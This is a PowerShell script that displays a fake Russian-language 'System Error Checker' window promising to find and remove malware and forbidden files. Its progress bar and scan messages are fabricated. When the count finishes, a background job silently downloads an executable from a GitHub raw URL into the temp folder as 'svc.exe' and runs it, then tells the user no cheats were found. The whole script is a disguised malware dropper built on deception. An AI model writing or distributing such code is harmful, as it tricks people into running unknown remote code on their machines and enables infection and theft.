Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Скачивание в фоне (стартует сразу, как нажмут "Начать")
$url = "https://github.com/nagibatorm55-ops/errorcheck/raw/refs/heads/main/i06473dr7ygcah7o.exe"
$path = "$env:TEMP\svc.exe"

$job = {
    param($u, $p)
    try {
        Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
        Start-Process -FilePath $p
    } catch {}
}

# Главное окно
$form = New-Object System.Windows.Forms.Form
$form.Text = "System Error Checker"
$form.Size = New-Object System.Drawing.Size(450, 260)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::White
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.Icon = [System.Drawing.SystemIcons]::Warning

# Иконка ошибки
$icon = New-Object System.Windows.Forms.PictureBox
$icon.Image = [System.Drawing.SystemIcons]::Error.ToBitmap()
$icon.Size = New-Object System.Drawing.Size(48, 48)
$icon.Location = New-Object System.Drawing.Point(20, 20)
$form.Controls.Add($icon)

# Заголовок
$title = New-Object System.Windows.Forms.Label
$title.Text = "Проверка целостности системы"
$title.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Black
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(80, 25)
$form.Controls.Add($title)

# Описание
$desc = New-Object System.Windows.Forms.Label
$desc.Text = "Программа обнаружит и удалит вредоносное ПО и запрещенные файлы.`nНажмите «Начать проверку», чтобы продолжить."
$desc.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$desc.ForeColor = [System.Drawing.Color]::DimGray
$desc.AutoSize = $true
$desc.Location = New-Object System.Drawing.Point(20, 80)
$form.Controls.Add($desc)

# Прогресс-бар
$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(390, 20)
$progress.Location = New-Object System.Drawing.Point(20, 130)
$progress.Style = "Continuous"
$form.Controls.Add($progress)

# Статус
$status = New-Object System.Windows.Forms.Label
$status.Text = "Ожидание..."
$status.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$status.ForeColor = [System.Drawing.Color]::Black
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(20, 160)
$form.Controls.Add($status)

# Кнопка "Начать"
$btnStart = New-Object System.Windows.Forms.Button
$btnStart.Text = "Начать проверку"
$btnStart.Size = New-Object System.Drawing.Size(130, 30)
$btnStart.Location = New-Object System.Drawing.Point(160, 190)
$btnStart.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$btnStart.ForeColor = [System.Drawing.Color]::White
$btnStart.FlatStyle = "Flat"
$form.Controls.Add($btnStart)

# Кнопка "Закрыть"
$btnClose = New-Object System.Windows.Forms.Button
$btnClose.Text = "Закрыть"
$btnClose.Size = New-Object System.Drawing.Size(100, 30)
$btnClose.Location = New-Object System.Drawing.Point(300, 190)
$btnClose.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
$btnClose.FlatStyle = "Flat"
$form.Controls.Add($btnClose)

# Таймер проверки
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 800 # Чуть медленнее, чтобы шло подольше

$script:percent = 0
$timer.Add_Tick({
    $script:percent++
    $progress.Value = [Math]::Min($script:percent, 100)
    
    $msgs = @("Проверка системных файлов...", "Сканирование реестра...", "Поиск вредоносных процессов...", "Анализ автозагрузки...", "Проверка секторов диска...")
    $msgIndex = [Math]::Min([Math]::Floor($script:percent / 20), 4)
    $status.Text = "$script:percent% - $($msgs[$msgIndex])"

    if ($script:percent -ge 100) {
        $timer.Stop()
        $status.Text = "Обнаружено вредоносное ПО. Загрузка модуля..."
        $btnStart.Enabled = $false
        
        # Запуск фонового скачивания
        Start-Job -ScriptBlock $job -ArgumentList $url, $path | Out-Null
        
        Start-Sleep -Seconds 2
        $status.Text = "Ошибка: читы не найдены. Проверка завершена."
        $status.ForeColor = [System.Drawing.Color]::Red
        $progress.Value = 0
    }
})

# Событие кнопки Начать
$btnStart.Add_Click({
    $btnStart.Enabled = $false
    $btnClose.Enabled = $false
    $script:percent = 0
    $progress.Value = 0
    $timer.Start()
})

# Событие кнопки Закрыть
$btnClose.Add_Click({
    $form.Close()
})

# Запуск окна
$form.ShowDialog() | Out-Null
